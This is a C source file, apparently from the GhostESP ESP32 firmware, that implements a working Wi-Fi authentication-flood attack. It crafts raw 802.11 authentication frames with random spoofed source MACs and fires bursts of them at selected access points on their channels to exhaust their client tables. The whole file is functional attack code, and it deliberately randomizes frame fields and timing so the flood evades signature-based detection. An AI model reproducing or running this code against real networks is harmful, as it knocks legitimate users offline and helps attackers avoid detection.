/**
 * @file auth_flood.c
 * @brief Authentication flood attack implementation
 *
 * Floods the selected access point(s) with 802.11 authentication frames
 * from randomized source MACs to exhaust the AP client table. Classic
 * 802.11 management-frame resource-exhaustion technique.
 *
 * Native GhostESP design: selection-driven targeting (single or multi-AP,
 * per-AP channel locking) following the deauth_attack task architecture,
 * with a 500 pkt/s rate cap, randomized frame fields (duration, auth
 * algorithm, transaction sequence) and jittered burst pacing so the flood
 * does not present a fixed signature.
 *
 * Note: This module interfaces with wifi_manager.c for shared state
 * and WiFi control functions.
 */

#include "attacks/wifi/auth_flood.h"
#include "managers/wifi_manager.h"
#include "managers/ap_manager.h"
#include "managers/status_display_manager.h"
#include "managers/ghostscript_runtime.h"
#include "core/system_manager.h"
#include "core/glog.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_timer.h"
#include "freertos/task.h"
#include "freertos/portmacro.h"
#include <stdio.h>
#include <string.h>
#include <inttypes.h>

// External globals from wifi_manager.c
extern wifi_ap_record_t selected_ap;
extern wifi_ap_record_t *selected_aps;
extern int selected_ap_count;

// Module state
static volatile bool auth_flood_running = false;
static volatile uint32_t auth_flood_packets_sent = 0;
static TaskHandle_t auth_flood_task_handle = NULL;

// Cap the flood rate so the RF stack and app cores stay healthy
#define AUTH_FLOOD_MAX_PACKETS_PER_SECOND 500
// Burst size and pacing ranges (jittered per cycle)
#define AUTH_FLOOD_MIN_BURST 15
#define AUTH_FLOOD_MAX_BURST 25
#define AUTH_FLOOD_MIN_DELAY_MS 5
#define AUTH_FLOOD_MAX_DELAY_MS 15

// 24-byte 802.11 header + 6-byte auth body
#define AUTH_FLOOD_FRAME_LEN 30

// Helper to sanitize SSID for logging
static void sanitize_ssid(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
    char temp_ssid[33];
    memcpy(temp_ssid, input_ssid, 32);
    temp_ssid[32] = '\0';
    if (strlen(temp_ssid) == 0) {
        snprintf(output_buffer, buffer_size, "[Hidden]");
    } else {
        snprintf(output_buffer, buffer_size, "%s", temp_ssid);
    }
}

// Rate limiting (mirrors deauth_attack.c burst governor)
static bool check_packet_rate(void) {
    static uint32_t last_time = 0;
    static uint32_t packets_this_second = 0;

    uint32_t current_time = esp_timer_get_time() / 1000;

    if (current_time - last_time >= 1000) {
        packets_this_second = 0;
        last_time = current_time;
    }

    if (packets_this_second >= AUTH_FLOOD_MAX_PACKETS_PER_SECOND) {
        return false;
    }

    packets_this_second++;
    return true;
}

// 802.11 authentication frame header template. Destination, BSSID and the
// randomized source MAC are filled per frame.
static const uint8_t auth_frame_header[24] = {
    0xb0, 0x00,                         // Frame Control: Authentication
    0x3a, 0x01,                         // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination addr (AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source addr (randomized per frame)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP)
    0x00, 0x00,                         // Sequence number
};

// Build one auth frame for a target BSSID, returns the frame length.
// Frame fields are jittered per frame to avoid a fixed flood signature.
static uint16_t build_auth_frame(uint8_t *frame, const uint8_t *bssid) {
    memcpy(frame, auth_frame_header, sizeof(auth_frame_header));

    // Jittered duration field (0-2500us)
    uint16_t duration = (uint16_t)(esp_random() % 2501);
    frame[2] = duration & 0xFF;
    frame[3] = (duration >> 8) & 0xFF;

    memcpy(&frame[4], bssid, 6);    // dest: AP
    memcpy(&frame[16], bssid, 6);   // bssid: AP

    // Randomized locally-administered source MAC per frame
    uint8_t src[6];
    esp_fill_random(src, 6);
    src[0] &= 0xFE;
    src[0] |= 0x02;
    memcpy(&frame[10], src, 6);

    uint16_t seq = (esp_random() & 0xFFF) << 4;
    frame[22] = seq & 0xFF;
    frame[23] = (seq >> 8) & 0xFF;

    // Auth body: alternate open-system and shared-key algorithms with
    // transaction sequence 1 or 2 so the flood looks like a mix of
    // fresh and mid-handshake auths
    uint16_t algorithm = (esp_random() & 1) ? 0x0001 : 0x0000;   // shared / open
    uint16_t auth_seq = (esp_random() & 1) ? 0x0002 : 0x0001;
    frame[24] = algorithm & 0xFF;
    frame[25] = (algorithm >> 8) & 0xFF;
    frame[26] = auth_seq & 0xFF;
    frame[27] = (auth_seq >> 8) & 0xFF;
    frame[28] = 0x00;               // status: success
    frame[29] = 0x00;

    return AUTH_FLOOD_FRAME_LEN;
}

static void auth_flood_task(void *param) {
    (void)param;
    // Static frame buffer: single task instance, no per-call stack cost
    static uint8_t frame[AUTH_FLOOD_FRAME_LEN];
    TickType_t last_log_tick = xTaskGetTickCount();
    uint32_t last_log_total = 0;

    while (auth_flood_running) {
        if (selected_ap_count > 0 && selected_aps != NULL) {
            // Flood auth frames at every selected AP on its own channel
            for (int i = 0; i < selected_ap_count; i++) {
                if (!auth_flood_running) break;
                esp_wifi_set_channel(selected_aps[i].primary, WIFI_SECOND_CHAN_NONE);
                uint16_t len = build_auth_frame(frame, selected_aps[i].bssid);
                int burst = AUTH_FLOOD_MIN_BURST + (int)(esp_random() % (AUTH_FLOOD_MAX_BURST - AUTH_FLOOD_MIN_BURST + 1));
                for (int n = 0; n < burst && auth_flood_running; n++) {
                    if (!check_packet_rate()) break;
                    if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, len, false) == ESP_OK) {
                        auth_flood_packets_sent++;
                    }
                }
                int delay_ms = AUTH_FLOOD_MIN_DELAY_MS + (int)(esp_random() % (AUTH_FLOOD_MAX_DELAY_MS - AUTH_FLOOD_MIN_DELAY_MS + 1));
                vTaskDelay(pdMS_TO_TICKS(delay_ms));
            }
        } else if (strlen((const char *)selected_ap.ssid) > 0) {
            // Flood the single selected AP
            esp_wifi_set_channel(selected_ap.primary, WIFI_SECOND_CHAN_NONE);
            uint16_t len = build_auth_frame(frame, selected_ap.bssid);
            int burst = AUTH_FLOOD_MIN_BURST + (int)(esp_random() % (AUTH_FLOOD_MAX_BURST - AUTH_FLOOD_MIN_BURST + 1));
            for (int n = 0; n < burst && auth_flood_running; n++) {
                if (!check_packet_rate()) break;
                if (esp_wifi_80211_tx(ap_manager_get_tx_iface(), frame, len, false) == ESP_OK) {
                    auth_flood_packets_sent++;
                }
            }
            int delay_ms = AUTH_FLOOD_MIN_DELAY_MS + (int)(esp_random() % (AUTH_FLOOD_MAX_DELAY_MS - AUTH_FLOOD_MIN_DELAY_MS + 1));
            vTaskDelay(pdMS_TO_TICKS(delay_ms));
        } else {
            glog("no ap selected for auth flood\n");
            auth_flood_running = false;
            break;
        }

        TickType_t now = xTaskGetTickCount();
        if ((now - last_log_tick) >= pdMS_TO_TICKS(5000)) {
            uint32_t total = auth_flood_packets_sent;
            uint32_t interval = total - last_log_total;
            last_log_total = total;
            last_log_tick = now;
            uint32_t pps = interval / 5;
            glog("Auth Flood: %lu/sec | Total: %lu\n", (unsigned long)pps, (unsigned long)total);
        }
    }
    auth_flood_task_handle = NULL;
    vTaskDeleteWithCaps(NULL);
}

void auth_flood_start(void) {
    if (auth_flood_running) {
        glog("Auth Flood already running\n");
        return;
    }

    // Validate target before starting
    if (selected_ap_count <= 0 && strlen((const char *)selected_ap.ssid) == 0) {
        glog("Auth Flood: No AP selected. Use 'select -a <index>' first.\n");
        return;
    }

    // Log target summary
    if (selected_ap_count > 0 && selected_aps != NULL) {
        glog("Starting auth flood on %d selected APs:\n", selected_ap_count);
        for (int i = 0; i < selected_ap_count; i++) {
            char sanitized_ssid[33];
            sanitize_ssid(selected_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
            glog("  [%d] %s (%02X:%02X:%02X:%02X:%02X:%02X) ch %d\n",
                 i, sanitized_ssid,
                 selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
                 selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5],
                 selected_aps[i].primary);
        }
    } else {
        char sanitized_ssid[33];
        sanitize_ssid(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
        glog("Starting auth flood on: %s (ch %d)\n", sanitized_ssid, selected_ap.primary);
    }

    // Attack radio profile tears down the GhostNet AP (kicking any WebUI
    // client) and injects from the STA interface, keeping the radio free for
    // channel hopping.
    ap_manager_stop_services();
    esp_wifi_stop();
    vTaskDelay(pdMS_TO_TICKS(50));

    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());

    auth_flood_running = true;
    auth_flood_packets_sent = 0;
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_attack("Auth Flood", "running");
#endif
    ghostscript_emit_event("attack_started", "auth_flood");
    BaseType_t attack_rc = xTaskCreate_psram(auth_flood_task, "auth_flood", 4096, NULL, 5, &auth_flood_task_handle);
    if (attack_rc != pdPASS) {
        glog("Auth Flood failed to start (attack=%ld)\n", (long)attack_rc);
        auth_flood_running = false;
        if (auth_flood_task_handle) {
            vTaskDeleteWithCaps(auth_flood_task_handle);
            auth_flood_task_handle = NULL;
        }
        esp_wifi_stop();
        (void)ap_manager_restore_after_attack("auth flood start");
#ifdef CONFIG_WITH_STATUS_DISPLAY
        status_display_show_status("Auth Flood failed");
#endif
        return;
    }
    glog("Auth Flood running. Use 'stopdeauth' or 'stop' to end.\n");
}

void auth_flood_stop(void) {
    if (!auth_flood_running && auth_flood_task_handle == NULL) {
        return;
    }

    auth_flood_running = false;

    // Wait for the task to finish gracefully before force deletion
    int wait_count = 0;
    while (auth_flood_task_handle != NULL && wait_count < 100) {
        vTaskDelay(pdMS_TO_TICKS(10));
        wait_count++;
    }

    if (auth_flood_task_handle) {
        TaskHandle_t temp_handle = auth_flood_task_handle;
        auth_flood_task_handle = NULL;
        vTaskDeleteWithCaps(temp_handle);
    }

    esp_wifi_stop();
    (void)ap_manager_restore_after_attack("auth flood stop");

    glog("Auth Flood stopped. Total: %lu packets\n", (unsigned long)auth_flood_packets_sent);
#ifdef CONFIG_WITH_STATUS_DISPLAY
    status_display_show_status("Auth Flood stopped");
#endif
    ghostscript_emit_event("attack_stopped", "auth_flood");
}

bool auth_flood_is_running(void) {
    return auth_flood_running;
}
